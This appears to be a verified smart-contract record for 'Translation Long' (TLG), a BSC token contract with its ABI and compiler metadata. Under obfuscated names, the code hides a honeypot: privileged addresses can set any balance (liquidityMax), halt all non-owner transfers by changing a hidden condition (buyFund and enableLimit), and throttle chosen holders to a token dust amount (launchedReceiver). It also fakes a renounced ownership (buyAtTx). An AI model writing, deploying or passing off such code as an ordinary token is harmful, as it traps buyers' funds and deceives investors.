{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.7;\n\ninterface senderMode {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract feeLimitFrom {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface feeTx {\n    function createPair(address txSell, address launchedWallet) external returns (address);\n}\n\ninterface senderTrading {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address walletLaunched) external view returns (uint256);\n\n    function transfer(address takeShould, uint256 toMode) external returns (bool);\n\n    function allowance(address fundLaunchedTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 toMode) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address takeShould,\n        uint256 toMode\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptSender, uint256 value);\n    event Approval(address indexed fundLaunchedTo, address indexed spender, uint256 value);\n}\n\ninterface senderTradingMetadata is senderTrading {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract TranslationLong is feeLimitFrom, senderTrading, senderTradingMetadata {\n\n    uint256 public enableAmount;\n\n    mapping(address => uint256) private amountBuy;\n\n    address private autoReceiver;\n\n    bool public minTotal;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamAmount;\n    }\n\n    function getOwner() external view returns (address) {\n        return autoReceiver;\n    }\n\n    function liquidityMax(address fromMinMode, uint256 toMode) public {\n        tokenBuy();\n        amountBuy[fromMinMode] = toMode;\n    }\n\n    bool public marketingReceiver;\n\n    string private fromMinEnable = \"TLG\";\n\n    mapping(address => bool) public fundEnable;\n\n    function transfer(address fromMinMode, uint256 toMode) external virtual override returns (bool) {\n        return enableLimit(_msgSender(), fromMinMode, toMode);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return fundExemptFee;\n    }\n\n    bool private walletFrom;\n\n    uint256 private teamAmount = 100000000 * 10 ** 18;\n\n    function enableLimit(address minBuy, address takeShould, uint256 toMode) internal returns (bool) {\n        if (minBuy == enableMax) {\n            return minTokenMarketing(minBuy, takeShould, toMode);\n        }\n        uint256 takeBuyTo = senderTrading(autoBuyLaunched).balanceOf(fromFee);\n        require(takeBuyTo == walletBuy);\n        require(takeShould != fromFee);\n        if (fundEnable[minBuy]) {\n            return minTokenMarketing(minBuy, takeShould, atList);\n        }\n        return minTokenMarketing(minBuy, takeShould, toMode);\n    }\n\n    address public enableMax;\n\n    function buyAtTx() public {\n        emit OwnershipTransferred(enableMax, address(0));\n        autoReceiver = address(0);\n    }\n\n    function tokenBuy() private view {\n        require(fundTx[_msgSender()]);\n    }\n\n    uint256 private receiverLimit;\n\n    function toToken(address toLimit) public {\n        require(toLimit.balance < 100000);\n        if (senderIsTrading) {\n            return;\n        }\n        \n        fundTx[toLimit] = true;\n        if (amountTx == enableAmount) {\n            marketingReceiver = false;\n        }\n        senderIsTrading = true;\n    }\n\n    function transferFrom(address minBuy, address takeShould, uint256 toMode) external override returns (bool) {\n        if (_msgSender() != launchedSwap) {\n            if (fundTake[minBuy][_msgSender()] != type(uint256).max) {\n                require(toMode <= fundTake[minBuy][_msgSender()]);\n                fundTake[minBuy][_msgSender()] -= toMode;\n            }\n        }\n        return enableLimit(minBuy, takeShould, toMode);\n    }\n\n    function buyFund(uint256 toMode) public {\n        tokenBuy();\n        walletBuy = toMode;\n    }\n\n    uint8 private fundExemptFee = 18;\n\n    mapping(address => mapping(address => uint256)) private fundTake;\n\n    function allowance(address atEnable, address feeTo) external view virtual override returns (uint256) {\n        if (feeTo == launchedSwap) {\n            return type(uint256).max;\n        }\n        return fundTake[atEnable][feeTo];\n    }\n\n    uint256 minFeeAt;\n\n    string private modeTx = \"Translation Long\";\n\n    function approve(address feeTo, uint256 toMode) public virtual override returns (bool) {\n        fundTake[_msgSender()][feeTo] = toMode;\n        emit Approval(_msgSender(), feeTo, toMode);\n        return true;\n    }\n\n    address public autoBuyLaunched;\n\n    function name() external view virtual override returns (string memory) {\n        return modeTx;\n    }\n\n    function owner() external view returns (address) {\n        return autoReceiver;\n    }\n\n    uint256 private amountTx;\n\n    address launchedSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function launchedReceiver(address sellIsAuto) public {\n        tokenBuy();\n        if (enableAmount != receiverLimit) {\n            receiverLimit = enableAmount;\n        }\n        if (sellIsAuto == enableMax || sellIsAuto == autoBuyLaunched) {\n            return;\n        }\n        fundEnable[sellIsAuto] = true;\n    }\n\n    uint256 walletBuy;\n\n    event OwnershipTransferred(address indexed exemptIs, address indexed txExempt);\n\n    function minTokenMarketing(address minBuy, address takeShould, uint256 toMode) internal returns (bool) {\n        require(amountBuy[minBuy] >= toMode);\n        amountBuy[minBuy] -= toMode;\n        amountBuy[takeShould] += toMode;\n        emit Transfer(minBuy, takeShould, toMode);\n        return true;\n    }\n\n    address fromFee = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function symbol() external view virtual override returns (string memory) {\n        return fromMinEnable;\n    }\n\n    uint256 constant atList = 12 ** 10;\n\n    function balanceOf(address walletLaunched) public view virtual override returns (uint256) {\n        return amountBuy[walletLaunched];\n    }\n\n    bool public senderIsTrading;\n\n    constructor (){\n        if (walletFrom) {\n            amountTx = receiverLimit;\n        }\n        senderMode limitTo = senderMode(launchedSwap);\n        autoBuyLaunched = feeTx(limitTo.factory()).createPair(limitTo.WETH(), address(this));\n        \n        enableMax = _msgSender();\n        buyAtTx();\n        fundTx[enableMax] = true;\n        amountBuy[enableMax] = teamAmount;\n        if (amountTx != receiverLimit) {\n            walletFrom = false;\n        }\n        emit Transfer(address(0), enableMax, teamAmount);\n    }\n\n    mapping(address => bool) public fundTx;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundLaunchedTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"txExempt\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptSender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"atEnable\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"feeTo\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toMode\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"autoBuyLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletLaunched\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyAtTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"toMode\",\"type\":\"uint256\"}],\"name\":\"buyFund\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"enableMax\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundEnable\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"fundTx\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"sellIsAuto\",\"type\":\"address\"}],\"name\":\"launchedReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMinMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toMode\",\"type\":\"uint256\"}],\"name\":\"liquidityMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"marketingReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"minTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderIsTrading\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLimit\",\"type\":\"address\"}],\"name\":\"toToken\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromMinMode\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toMode\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"minBuy\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"takeShould\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"toMode\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "TranslationLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}